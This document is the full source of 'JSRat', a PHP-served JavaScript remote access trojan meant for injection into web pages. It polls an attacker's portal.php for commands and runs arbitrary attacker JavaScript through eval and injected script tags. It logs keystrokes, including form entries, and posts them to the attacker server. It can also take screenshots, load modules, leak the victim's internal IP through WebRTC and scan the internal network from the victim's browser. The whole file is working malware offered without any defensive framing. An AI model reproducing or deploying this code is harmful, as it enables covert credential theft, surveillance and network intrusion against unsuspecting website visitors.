<?php
header('Content-Type: application/javascript');
header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
header("Cache-Control: no-store, no-cache, must-revalidate"); // HTTP/1.1
header("Cache-Control: post-check=0, pre-check=0", false);
header("Pragma: no-cache"); // HTTP/1.0
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
function out($js) {
  $js = (explode('<script>', $js))[1];
  $js = str_replace("\n", '', $js);
  $js = str_replace('  ', ' ', $js);
  $js = str_replace('  ', ' ', $js);
  return $js;
}
//ob_start("out");
?>
/*
 * JSRat
 * By: Andrew Blalock (https://github.com/derp-all-day)
 */
//<script>
let jsr = {
  host_url: "<?=$_GET['proto'].'://'.$_SERVER['HTTP_HOST'].str_replace('/js/listener.php', '', $_SERVER['PHP_SELF'])?>",
  recv: null,
  cnct: null,
  loc: "",
  presses: "",
  jsr: (function() {
    document.addEventListener('visibilitychange', jsr.vis);
  }),
  vis: (function(){
    if(document.hidden || document.msHidden || document.webkitHidden) {
      jsr.stop();
    } else {
      jsr.start();
    }
  }),
  start: (function(){
    console.log("[SESSION START]");
    jsr.hello();
    jsr.getcmd();
    jsr.recv = setInterval(jsr.getcmd, 30000);
    jsr.cnct = setInterval(jsr.hello, 60000);
    jsr.pageChange();
    window.addEventListener('popstate', jsr.hello);
  }),
  stop: (function(){
    clearInterval(jsr.recv);
    clearInterval(jsr.cnct);
    window.removeEventListener('popstate', jsr.hello);
    console.log("[SESSION STOP]");
  }),
  getcmd: (function(){
    jsr.ajaxReq(jsr.host_url + "/portal.php?recv="+Math.floor((Math.random()*99999999)+1),function(x){
      var data = JSON.parse(x);
      if(data.command == "customjs") {
        jsr.callScript( data.argument1 );
      } else if (data.command == "close") {
          window.removeEventListener("visibilitychange", jsr.vis);
          jsr.stop();
          clearInterval(jsr.cnct);
      } else if (data.command == "stopkeylog") {
        window.removeEventListener("keydown", jsr.sendLog);
        jsr.cleanup();
      } else if (data.command == "keylog") {
        window.addEventListener("keydown", jsr.sendLog);
        jsr.captureSubmit();
      } else if (data.command == "console") {
        if(/^net\ /.test(data.argument1)) {
            if(/internal/.test(data.argument1)) {
                if(/ip/.test(data.argument1)) {
                  try {
                    net.getInternalIP(data.argument1);
                  } catch(e) {
                    jsr.sendConsole(e,data.argument1);
                  }
                } else if(/up/.test(data.argument1)) {
                  var ip = data.argument1.split(':');
                  if(ip[1] == undefined) {
                    outlog = "USAGE: net internal up :{IP}";
                  } else {
                    try {
                      new net.scan(ip[1]);
                      outlog = "INFO: Results stored in 'net.up;'";
                    } catch(e) {
                      outlog = e
                    }
                  }
                  jsr.sendConsole(JSON.stringify(outlog),data.argument1);
                } else {
                  outlog = 'USAGE: net internal {ip|up}';
                  jsr.sendConsole(outlog,data.argument1);
                }
            } else if(/external/.test(data.argument1)) {
                if(/ip/.test(data.argument1)) {
                  try {
                    net.getExternalIP();
                  } catch(e) {
                    jsr.sendConsole(e,data.argument1);
                  }
                } else if(/up/.test(data.argument1)) {
                  //scan: (function(servers, method = "web", port = '', protocol = "//")
                  var ip = data.argument1.split(':');
                  if(ip[1] == undefined) {
                    outlog = "USAGE: net external up :{IP}";
                    console.log(outlog);
                  } else {
                    try {
                      new net.scan(ip[1]);
                      outlog = "INFO: Results stored in 'net.up;'";
                    } catch(e) {
                      outlog = e
                    }
                  }
                  outlog = tty.console(outlog);
                  jsr.sendConsole(outlog,data.argument1);
                } else {
                  outlog = 'USAGE: net external {ip|up}';
                  jsr.sendConsole(outlog,data.argument1);
                }
            } else {
              outlog = 'USAGE: net {internal|external}';
              jsr.sendConsole(outlog,data.argument1);
            }
        } else {
            try {
              outlog = tty.console(data.argument1);
              jsr.sendConsole(outlog,data.argument1);
            } catch(e) {
              outlog = 'FatalError: ' + e;
              jsr.sendConsole(outlog,data.argument1);
            }
        }
      } else if(data.command == "screenshot") {
        jsr.callScript(jsr.host_url + "/js/screenshot.php");
      } else if(data.command == "load_mod") {
        jsr.callScript( data.argument1, true );
      } else if(data.command == "unload_mod") {
        if(typeof data.argument2 == "string") {
          window[data.argument2]();
        }
        document.getElementById("jsr_mod_" + data.argument1).remove();
      }
    }, "GET" );
  }),
  sendConsole: (function(outlog, arg){
    jsr.ajaxReq(jsr.host_url + "/portal.php?post=console", function(c){}, "POST", { log: btoa(outlog), cmd: arg });
  }),
  hello: (function(){
    jsr.ajaxReq(jsr.host_url + "/portal.php?post=hello&cb=" + Math.floor((Math.random() * 99999999) + 1), function(x){
      var data = JSON.parse(x);
      if(data.log == "true") {
        window.addEventListener("keydown", jsr.sendLog);
        jsr.captureSubmit();
      } else {
        window.removeEventListener("keydown", jsr.sendLog);
        jsr.cleanup();
      }
    }, "POST", {ref: window.location.href});
  }),
  sendLog: (function(x){
    jsr.presses = jsr.presses + jsr.filterKey(x.key);
    if(jsr.loc == "") {
      jsr.loc = window.location.href;
      jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses, ref: window.location.href });
      jsr.presses = "";
    } else if(jsr.presses.length>25) {
      jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses });
      jsr.presses = "";
    }
  }),
  captureSubmit: (function() {
    var els = document.querySelectorAll('form');
    for (var i=0; i < els.length; i++) {
       if((els[i].hasAttribute("onsubmit") && !els[i].getAttribute("onsubmit").indexOf('jsr.cleanup();')) || !els[i].hasAttribute("onsubmit") ) {
          if(els[i].hasAttribute("onsubmit")) {
             els[i].setAttribute("onsubmit", "jsr.cleanup();" + els[i].getAttribute("onsubmit"));
          } else {
             els[i].setAttribute("onsubmit", "jsr.cleanup();");
          }
       }
    }
  }),
  cleanup: (function(){
    if(jsr.presses != "") {
      jsr.ajaxReq(jsr.host_url + "/portal.php?post=klog", function(x){}, "POST", { log: jsr.presses, flush: "true" });
      jsr.presses = "";
    }
  }),
  pageChange: (function(){
    document.addEventListener('click', function (event) {
      jsr.cleanup();
    });
    window.addEventListener('onbeforeunload', function(e) {
      jsr.cleanup();
      alert("Are you sure you would like to leave this page?");
    });
  }),
  filterKey: (function(x){
    var keymap = {
      "Backspace":"{BS}","ArrowUp":"{AU}","ArrowDown":"{AD}","ArrowLeft":"{AL}","Alt":"{ALT}","ArrowRight":"{AR}",
      "Shift":"{SHFT}","Control":"{CTRL}","Escape":"{ESC}","Tab":"{TAB}","Enter":"{ENTR}","CapsLock":"{CL}"
    };
    return keymap[x] || x;
  }),
  callScript: (function( url, mod = false ) {
    var script=document.createElement("script");
    script.setAttribute("type","text/javascript");
    if(mod) {
      script.setAttribute("src", jsr.host_url + "/modules/" + url + ".module.js");
      script.setAttribute("id", "jsr_mod_" + url);
    } else {
      script.setAttribute("src", url);
    }
    var head = document.getElementsByTagName("head")[0];
    head.appendChild(script);
  }),
  ajaxReq: (function( url,callback,method="GET",data=""){
    method = ({"GET":"GET","POST":"POST"})[method.toUpperCase()] || "GET";
    var xhr = new XMLHttpRequest();
    xhr.open(method, url);
    if(method == "POST"){
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    }
    xhr.onload = function() {if (xhr.status === 200) {
        callback(xhr.responseText);
      }
    };
    if(method == "POST") {
      var query = "";
      for (var key in data) {
        query += encodeURIComponent(key)+"="+encodeURIComponent(data[key])+"&";
      }
      xhr.send((query.substring(0, query.length - 1)));
    } else {
      xhr.send();
    }
  })
};
window.ko || jsr.callScript("https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js");

//internal network attack framework
let net = {
  getInternalIP: (function(){
    var RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
    if (RTCPeerConnection) (function () {
      var rtc = new RTCPeerConnection({iceServers:[]});
      if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
        rtc.createDataChannel('', {reliable:false});
      };
      rtc.onicecandidate = function (evt) {
        if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
      };
      rtc.createOffer(function (offerDesc) {
        grepSDP(offerDesc.sdp);
        rtc.setLocalDescription(offerDesc);
      }, function (e) { console.warn("offer failed", e); });
      var addrs = Object.create(null);
      addrs["0.0.0.0"] = false;
      function updateDisplay(newAddr) {
        if (newAddr in addrs) return;
        else addrs[newAddr] = true;
        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
        addrs = displayAddrs;
      }
      function grepSDP(sdp) {
        var hosts = [];
        sdp.split('\r\n').forEach(function (line) {
            if (~line.indexOf("a=candidate")) {
                var parts = line.split(' '),
                    addr = parts[4],
                    type = parts[7];
                if (type === 'host') updateDisplay(addr);
            } else if (~line.indexOf("c=")) {
                var parts = line.split(' '),
                addr = parts[2];
                updateDisplay(addr)
            }
            if(typeof addr != 'object' && typeof addr != 'undefined' && addr != '0.0.0.0') {
              outlog = tty.console({'internal_ip': addr})
              jsr.sendConsole(outlog,"net internal ip")
              return '';
            }
        });
      }
      outlog = tty.console({'internal_ip': 'unknown'})
    })();
  }),
  getExternalIP: (function(){
    jsr.ajaxReq( 'https://api.ipify.org/?format=json',function(x){
      outlog = tty.console(JSON.parse(x))
      jsr.sendConsole(outlog.split('ip').join('external_ip'),'net external ip')
    },method="GET");
  }),
  ipRange: (function(CIDR, start = 0, finish = 254) {
  var range = [];
  for (i = (start - 1); i < finish; i++) {
    range[i] = (((CIDR.split('/'))[0].split('.')).slice(0, -1)).join('.') + '.' + (i + 1);
  }
  return range;
}),
tcp_ping: (function(ip, port, protocol, callback) {
  try {
    var milliseconds;
    var started = new Date().getTime();
    var http = new XMLHttpRequest();
    if (protocol !== "//") {
      protocol += "://";
    }
    try {
      http.open("GET", protocol + ip + ":" + port, /*async*/ true);
    } catch (e) {
      this.callback('Timeout', e);
    }
    http.onreadystatechange = function() { //lol
      if (http.readyState == 4) {
        var ended = new Date().getTime();
        this.milliseconds = ended - started;
      }
    }
    try {
      let data = {
        headers: {
          Accept: "application/json",
          Origin: "http://127.0.0.1/"
        },
        method: 'GET'
      };
      http.send(JSON.stringify(data));
    } catch (e) {
      if (milliseconds <= 0200) {
        this.callback('Responded', e);
      } else {
        this.callback('Timeout', e);
      }
    }
  } catch (e) {
    callback("Blocked by CORS", e);
  }
}),
web_ping: (function(ip, port = "", protocol = "//", callback) { //lol
  if (protocol != '//') {
    protocol += '://'
  }
  if (port != 80 && port != "") {
    port = ':' + port;
  } else if (port == 80) {
    port = ":80";
    protocol = 'http://';
  } else {
    port = "";
  }
  if (!this.inUse) {
    this.status = 'unchecked';
    this.inUse = true;
    this.callback = callback;
    this.ip = ip;
    var _that = this;
    this.img = new Image();
    this.img.onload = function() {
      _that.inUse = false;
      _that.callback('responded');

    };
    this.img.onerror = function(e) {
      if (_that.inUse) {
        _that.inUse = false;
        _that.callback('responded', e);
      }

    };
    this.start = new Date().getTime();
    this.img.src = protocol + ip + port;
    this.timer = setTimeout(function() {
      if (_that.inUse) {
        _that.inUse = false;
        _that.callback('timeout');
      }
    }, 2000);
  }
}),
up: {},
scan: (function(servers, method = "web", port = '', protocol = "//") {
  if((window.ko == undefined)) {
    //jsr.callScript("https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js");
    (window.ko || document.write("<script src='https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js'><\/script>"));
    console.log('ko should be loaded');
  }
  if (!Array.isArray(servers)) {
    servers = servers.split('/')
  }
  var self = this;
  var myServers = [];
  ko.utils.arrayForEach(servers, function(location) {
    myServers.push({
      name: location,
      status: ko.observable('unchecked')
    });
  });
  self.servers = ko.observableArray(myServers);
  this.out = "";
  ko.utils.arrayForEach(self.servers(), function(s) {
    s.status('checking');
    if (method === 'web' && s.name != undefined) {
      new net.web_ping(s.name, port, protocol, function(status, e) {
        s.status(status);
        net.up[s.name] = status;
        //return ':' + s.name + '-' + status;
      });
    } else if (s.name != undefined) { //tcp
      new net.tcp_ping(s.name, port, protocol, function(status, e) {
        s.status(status);
        net.up[s.name] = status;
        //return ':' + s.name + '-' + status;
      });
    }
  });
})
  //https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.0/knockout-min.js
}
//terminal object
let tty = {
  console: (function(c){
    try {
      var out = eval(c);
      if (typeof out == 'object') {
        var seen = [];
        return (JSON && JSON.stringify ? JSON.stringify(out, function(key, val) {
          if (val != null && typeof val == "object") {
            if (seen.indexOf(val) >= 0) {
              return;
            }
            seen.push(val);
          }
          return val;
        }) : String(c));
      } else {
        return out;
      }
    } catch(e) {
      return e;
    }
  })
}
jsr.jsr();
jsr.start();
